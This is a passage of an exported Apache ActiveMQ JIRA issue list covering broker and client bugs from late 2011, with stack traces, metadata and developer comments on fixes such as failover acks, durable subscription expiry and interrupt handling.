I have also noticed that there are several places in ActiveMQMessageConsumer that allow potential creation of acks that do not coincide with the session settings.  Perhaps ActiveMQSession.sendAck should throw IllegalArgumentException if the ack type does not match the session?
",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,59119,,,Tue Jan 15 22:39:22 UTC 2013,,,,,,,,,,,"0|i0ea6n:",81412,,,,,,,,,,,,,,,,,,,,,"11/Oct/11 13:06;gtully;I think that ack should always be an individual ack, not one that matches all preceding messages. So MessageAck.INDIVIDUAL_ACK_TYPE. Can you validate that?

Any chance that you have a test case?

note: when you provide a patch, you need to attach the patch file and tick the check box to license grant on the file upload form. Otherwise we can't commit it.;;;","11/Oct/11 13:10;mserrano;I will attach a better patch.  What you say makes sense, and I will test only using MessageAck.INDIVIDUAL_ACK_TYPE.  I have just discovered this and am not sure how to reproduce in a test case.  I found it in a integration test that has multiple processes.  I'll see what I can do.  This occurs after a master/slave failover.  Do you want the patch without the test case or would you rather wait?;;;","11/Oct/11 13:11;mserrano;removing (incomplete) patch that was in description;;;","11/Oct/11 13:25;gtully;A patch with a junit test would be ideal :-) Thanks for the contribution, much appreciated.

Have a peek at org.apache.activemq.transport.failover.FailoverTransactionTest for some inspiration.
In any event I think you found a bug, but I am interested to understand how the inflight and dequeue counts get out of sync.;;;","11/Oct/11 13:36;mserrano;Ok.  I will work on a test.  BTW, what I meant about the counts being wrong is that they don't reflect the reality of what has occurred (at least from the client point of view).  ;;;","15/Jan/13 22:39;tabish;Fix by AMQ-3568 from what I can tell.  No test case on this issue to confirm it solves all the reporters issues. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
expiry of offline durable subscription on activation can lead do duplicate expiry processing and negative pending cursor size,AMQ-3532,12526483,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,10/Oct/11 18:07,10/Oct/11 18:24,14/Jul/23 05:43,10/Oct/11 18:24,5.5.0,,,,,5.6.0,,,Broker,,,,0,durable,expiry,,,,,,,"The durable subscription cursor pending message count can go negative and prevent dispatch of later unexpired messages. Also, contention between dispatch and the expiry task can lead to blocked dispatch.",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,56873,,,Mon Oct 10 18:24:14 UTC 2011,,,,,,,,,,,"0|i0agsn:",58994,,,,,,,,,,,,,,,,,,,,,"10/Oct/11 18:24;gtully;resolved in http://svn.apache.org/viewvc?rev=1181112&view=rev

duplicate cursor remove was leaving decrementing size twice. Additionally, there was contention from doing expiry from a recovery listener.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Calling Thread.interrupt while in MessageConsumer#receive(timeout) generates java.io.InterruptedIOException and leaks Connection ,AMQ-3529,12526328,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,p.mouawad@ubik-ingenierie.com,p.mouawad@ubik-ingenierie.com,08/Oct/11 16:03,27/Nov/15 12:36,14/Jul/23 05:43,30/Oct/11 23:28,5.5.0,,,,,5.6.0,,,JMS client,,,,0,,,,,,,,,"Hello,
While running tests with JMeter and calling stop while test is running, I see that Transport thread stays open and all close() on Connection, MessageConsumer, Session calls fails with exception:
2011/10/08 17:16:59 ERROR - jmeter.protocol.jms.client.ReceiveSubscriber: Error during close:  javax.jms.JMSException: java.io.InterruptedIOException
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:62)
	at org.apache.activemq.ActiveMQConnection.doSyncSendPacket(ActiveMQConnection.java:1342)
	at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:660)
	at org.apache.jmeter.protocol.jms.Utils.close(Utils.java:65)
	at org.apache.jmeter.protocol.jms.client.ReceiveSubscriber.close(ReceiveSubscriber.java:236)
	at org.apache.jmeter.protocol.jms.sampler.SubscriberSampler.threadFinished(SubscriberSampler.java:305)
	at org.apache.jmeter.threads.JMeterThread$ThreadListenerTraverser.addNode(JMeterThread.java:579)
	at org.apache.jorphan.collections.HashTree.traverseInto(HashTree.java:986)
	at org.apache.jorphan.collections.HashTree.traverse(HashTree.java:969)
	at org.apache.jmeter.threads.JMeterThread.threadFinished(JMeterThread.java:554)
	at org.apache.jmeter.threads.JMeterThread.run(JMeterThread.java:328)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.io.InterruptedIOException
	at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:102)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
	at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81)
	at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:91)
	at org.apache.activemq.ActiveMQConnection.doSyncSendPacket(ActiveMQConnection.java:1329)
	... 10 more


I opened an issue in JMeter with all details but I think issue is in ActiveMQ, see:
https://issues.apache.org/bugzilla/show_bug.cgi?id=51997

Issue contains a Test Plan, and all details.

Regards
Philippe
",,jira-bot,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3547,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Oct/11 10:41;p.mouawad@ubik-ingenierie.com;AMQ3529Test.java;https://issues.apache.org/jira/secure/attachment/12501508/AMQ3529Test.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,50595,,,Fri Nov 27 12:36:05 UTC 2015,,,,,,,,,,,"0|i0air3:",59311,,,,,,,,,,,,,,,,,,,,,"08/Oct/11 22:08;tabish;Creating a JUnit test to reproduce what you are seeing would be helpful;;;","13/Oct/11 06:37;p.mouawad@ubik-ingenierie.com;Hello,
Creating a JUnit Test is difficult as issues involves threading and interruption.
With Test Plan provided at JMeter Bugzilla you can reproduce it very easily with the described scenario, 
note it doesn't occur with OpenJMS.

Regards
Philippe;;;","13/Oct/11 15:09;tabish;Since JMeter can't be part of the unit tests its important to capture something like this in a JUnit test so that it can be investigated and protected from future breakage.;;;","17/Oct/11 21:49;tabish;A JUnit test case demonstrating how this issue occurs under normal usage is needed in order to reproduce and investigate this issue.;;;","18/Oct/11 18:45;p.mouawad@ubik-ingenierie.com;Hello,
As I explained it is very difficult to create a JUnit Test Case for this issue as it is related to Multi Threading and interrupt.

You shouldn't close it like this, why don't you want to try the Test Plan attached in JMeter Bugzilla ?

I will try to create a Test case (no Junit one) and descrbie the scenario to reproduce but that will take some time.;;;","29/Oct/11 21:46;tabish;Same problem in both cases;;;","29/Oct/11 21:46;tabish;Fixed by AMQ-3547;;;","30/Oct/11 08:04;p.mouawad@ubik-ingenierie.com;Hello,
I tested with last 5.6 snapshot integrating the fix, issue is still here for me.

Regards
Philippe;;;","30/Oct/11 10:26;p.mouawad@ubik-ingenierie.com;Test case to reproduce issue;;;","30/Oct/11 10:41;p.mouawad@ubik-ingenierie.com;Changed test to show different errors.
;;;","30/Oct/11 23:29;tabish;Additional fixes added for updated test case.;;;","31/Oct/11 04:40;p.mouawad@ubik-ingenierie.com;Hello,
I confirm issue is fixed, I tested with last nightly build.

Thanks.
Regards
Philippe;;;","27/Nov/15 12:36;jira-bot;Commit 0a12bcb928f151b5ace9a0cffc34ec717b6a8e9c in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=0a12bcb ]

https://issues.apache.org/jira/browse/AMQ-2191 https://issues.apache.org/jira/browse/AMQ-3529 - rework fixes to remove uncertanty from dealing with intettuptedexception. Sync requests will trap interrupts that ocurr while waiting for responses and fail the connection with an interruptedioexception. Interrupts pending before requests will be suppressed, allowing possible clean shutdown. It is not safe to replay openwire ops b/c they are not idempotent, the only safe option is to have a teardown of the broker side state from a close
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failed to start ActiveMQ JMS Message Broker. Reason: java.lang.ArrayIndexOutOfBoundsException,AMQ-3528,12526298,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,linjinxiao,linjinxiao,08/Oct/11 01:37,13/Oct/11 01:19,14/Jul/23 05:43,11/Oct/11 20:03,5.4.2,5.5.0,,,,,,,Broker,,,,0,,,,,,,,,"I connect the oracle db for store and manage message. It work fine for month. But it throws an exception recently, and many different machine which broker installed on throw the exception at the same time. 
This can be fixed by unzip the install file and deploy again.
This is the exception trace:

2011-09-29 09:50:20,866 | ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.lang.ArrayIndexOutOfBoundsException | org.apache.activemq.broker.BrokerService | main
java.lang.ArrayIndexOutOfBoundsException
	at java.lang.System.arraycopy(Native Method)
	at org.apache.kahadb.page.Transaction$2.read(Transaction.java:494)
	at java.io.DataInputStream.readFully(DataInputStream.java:178)
	at java.io.DataInputStream.readFully(DataInputStream.java:152)
	at org.apache.activemq.store.kahadb.MessageDatabase$HashSetStringMarshaller.readPayload(MessageDatabase.java:2352)
	at org.apache.activemq.store.kahadb.MessageDatabase$HashSetStringMarshaller.readPayload(MessageDatabase.java:2335)
	at org.apache.kahadb.index.BTreeNode$Marshaller.readPayload(BTreeNode.java:201)
	at org.apache.kahadb.index.BTreeNode$Marshaller.readPayload(BTreeNode.java:147)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:406)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:361)
	at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262)
	at org.apache.kahadb.index.BTreeNode$BTreeIterator.findNextPage(BTreeNode.java:103)
	at org.apache.kahadb.index.BTreeNode$BTreeIterator.hasNext(BTreeNode.java:121)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore$3.execute(KahaDBStore.java:736)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore$3.execute(KahaDBStore.java:726)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:751)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.getMessageCount(KahaDBStore.java:725)
	at org.apache.activemq.store.ProxyTopicMessageStore.getMessageCount(ProxyTopicMessageStore.java:116)
	at org.apache.activemq.broker.region.DurableTopicSubscription.add(DurableTopicSubscription.java:97)
	at org.apache.activemq.broker.region.Topic.addSubscription(Topic.java:146)
	at org.apache.activemq.broker.region.TopicRegion.addSubscriptionsForDestination(TopicRegion.java:197)
	at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:132)
	at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:301)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:157)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151)
	at org.apache.activemq.broker.region.AbstractRegion.start(AbstractRegion.java:95)
	at org.apache.activemq.broker.region.RegionBroker.start(RegionBroker.java:199)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.start(ManagedRegionBroker.java:106)
	at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157)
	at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157)
	at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:109)
	at org.apache.activemq.broker.BrokerService$3.start(BrokerService.java:1781)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:489)
	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:60)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:117)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:115)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
2011-09-29 09:50:20,991 | INFO  | ActiveMQ Message Broker (localhost, null) is shutting down | org.apache.activemq.broker.BrokerService | main
2011-09-29 09:50:20,991 | INFO  | Connector openwire Stopped | org.apache.activemq.broker.TransportConnector | main
2011-09-29 09:50:21,007 | INFO  | PListStore:D:\hsp\apache-activemq-5.4.2\bin\..\data\localhost\tmp_storage stopped | org.apache.activemq.store.kahadb.plist.PListStore | main","windows 7, linux ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,50556,,,Thu Oct 13 01:19:02 UTC 2011,,,,,,,,,,,"0|i0ebrb:",81667,,,,,,,,,,,,,,,,,,,,,"10/Oct/11 18:26;tabish;The recent refactoring of the way the MessageDatabase stores the data for a StoredDestination should address this sort of issue.;;;","11/Oct/11 20:03;tabish;The MessageDatabase code has been refactored on trunk and stores data such that this sort of thing should not happen any longer.  Suggest trying the latest 5.6-SNAPSHOT with a clean data dir
;;;","13/Oct/11 01:19;linjinxiao;OK,thanks! I will try the new version.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
./activemq script cannot be started on Solaris OS 10,AMQ-3527,12526199,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,07/Oct/11 13:18,07/Oct/11 13:22,14/Jul/23 05:43,07/Oct/11 13:22,,,,,,5.6.0,,,,,,,0,activemq,script,,,,,,,issue with finding whoami and use of bash $(..) evaluations in place of `` bourne shell syntax,,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,50036,,,Fri Oct 07 13:22:49 UTC 2011,,,,,,,,,,,"0|i0airb:",59312,,,,,,,,,,,,,,,,,,,,,"07/Oct/11 13:22;gtully;fix in http://svn.apache.org/viewvc?rev=1180032&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"JDBC persistence adapter, destination mbeans not visible on restart till producers or consumers  reattach",AMQ-3526,12526175,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,07/Oct/11 10:55,07/Jan/12 19:24,14/Jul/23 05:43,07/Oct/11 11:02,5.5.0,,,,,5.6.0,,,Broker,JMX,,,0,destinations,jdbc,jmx,restart,,,,,"With the jdbc store, if there are pending messages on a restart, the destinations do not appear in jmx till they are reused. So inactive destinations are not recreated on restart.
Any use of the destination will get the mbean to be created, new producer/consumer etc.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3655,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,49905,,,Fri Oct 07 11:02:29 UTC 2011,,,,,,,,,,,"0|i0airj:",59313,,,,,,,,,,,,,,,,,,,,,"07/Oct/11 11:02;gtully;fix and test in  http://svn.apache.org/viewvc?rev=1179999&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Messages seem to be getting stuck on queues,AMQ-3525,12526165,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,pblackburn,pblackburn,07/Oct/11 10:02,15/Feb/12 10:42,14/Jul/23 05:43,15/Feb/12 10:41,5.5.0,5.5.1,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Running load test of our application using AMQ as the JMS provider, messages seem to get stuck on the queues. After load test was stopped, but application was still running and all consumers still connected to the AMQ server. Several minutes later, the queue sizes were:

QUEUE_A                                           2
QUEUE_B                                           3
QUEUE_C                                           3
QUEUE_D                                           1
QUEUE_E                                           33

Our application was then stopped and the AMQ server restarted. There were no consumers for any of the queues at this point. After restart, the queue sizes were as follows:

QUEUE_A                                           2
QUEUE_C                                           3
QUEUE_E                                           26

Spot checks of the messages remaining after broker restart appear to show that they were successfully consumed during the load test run, but are somehow still on the queues.
","Red Hat Enterprise Linux 5, x86_64
apache-activemq-5.5-fuse-20110915.022452-46",sslavic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3576,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,49892,,,Wed Feb 15 10:41:11 UTC 2012,,,,,,,,,,,"0|i0airr:",59314,,,,,,,,,,,,,,,,,,,,,"07/Oct/11 14:02;gtully;would it be possible to simplify your load test and still be able to reproduce this observation?

After a restart, when there are 2,3,26 messages, is it possible to consume these messages?
If so, they would be considered duplicates from the application perspective, correct?

The reason I ask is to determine if the problem is related to skipped messages or destination counters.

The key to getting to the bottom of this is some test code or a description that can reproduce, and ideally reliably.
;;;","15/Feb/12 10:41;gtully;resolved via https://issues.apache.org/jira/browse/AMQ-3576;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException in TraceBrokerPath plugin.,AMQ-3524,12525986,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,tabish,tabish,tabish,05/Oct/11 23:16,05/Oct/11 23:17,14/Jul/23 05:43,05/Oct/11 23:17,5.x,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Exception in thread ""BrokerService[GTIC01M01] Task-3"" java.lang.NullPointerException
at org.apache.activemq.broker.util.TraceBrokerPathPlugin.preProcessDispatch(TraceBrokerPathPlugin.java:53)
at org.apache.activemq.broker.MutableBrokerFilter.preProcessDispatch(MutableBrokerFilter.java:203)
at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:826)
at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:864)
at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:896)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918)
at java.lang.Thread.run(Thread.java:735)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,49312,,,Wed Oct 05 23:17:44 UTC 2011,,,,,,,,,,,"0|i0airz:",59315,,,,,,,,,,,,,,,,,,,,,"05/Oct/11 23:17;tabish;Patch applied in trunk to check for nulls;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NetworkConnector MBean unregistration can fail with a transport disconnect - leaving dangling mbean,AMQ-3523,12525930,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,05/Oct/11 18:05,05/Oct/11 21:13,14/Jul/23 05:43,05/Oct/11 21:13,5.5.0,,,,,5.6.0,,,Broker,JMX,,,0,jmx,networkConnector,,,,,,,"MBeans for NetworkConnectors embed the target address, but on unregistraton due to shutdown from a transport failure, the remote address can be null, resulting in a failure to find the MBean. The  mbean name should be remembered from registration rather than generated on the fly.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,46549,,,Wed Oct 05 21:13:22 UTC 2011,,,,,,,,,,,"0|i0ais7:",59316,,,,,,,,,,,,,,,,,,,,,"05/Oct/11 21:13;gtully;fixed with http://svn.apache.org/viewvc?rev=1179355&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MessageServletSupport request body does not check the content-type in an intelligent way,AMQ-3518,12525230,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,tcdurbin,tcdurbin,29/Sep/11 18:48,01/Nov/13 16:59,14/Jul/23 05:43,29/Sep/11 21:59,5.5.0,,,,,5.6.0,,,Samples,,,,0,patch,,,,,,,,"The MessageServlet used for the REST interface supplied in the demo web app will not correctly use the request body of an HTTP POST request if the content-type header contains more than just the MIME type.

The specification for this header indicates that there can be multiple values in this header.  ",Servlet container,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4668,,,,,,,,,,,,,"29/Sep/11 18:49;tcdurbin;MessageServletSupport.patch;https://issues.apache.org/jira/secure/attachment/12497039/MessageServletSupport.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,40353,,,Thu Sep 29 22:17:32 UTC 2011,,,,,,,Patch Available,,,,"0|i0ait3:",59320,,,,,,,,,,,,,,,,,,,,,"29/Sep/11 21:59;tabish;Applied a fix for this, although I did it in a slightly different way than the patch.  

{code}
String contentType = request.getContentType();
if (answer == null && contentType != null && contentType.toLowerCase().startsWith(""text/xml"")) {
{code};;;","29/Sep/11 22:17;tcdurbin;Even better.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover Transport will never call transportResumed when it reconnects to a hot backup transport.,AMQ-3517,12525096,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,28/Sep/11 20:03,29/Sep/11 21:43,14/Jul/23 05:43,29/Sep/11 21:43,5.x,,,,,5.6.0,,,Transport,,,,0,,,,,,,,,"The Failover transport will always call transportInterrupted but if there's a hot backup in the backups list it won't call the transportResumed method on its listener, it just reconnects and 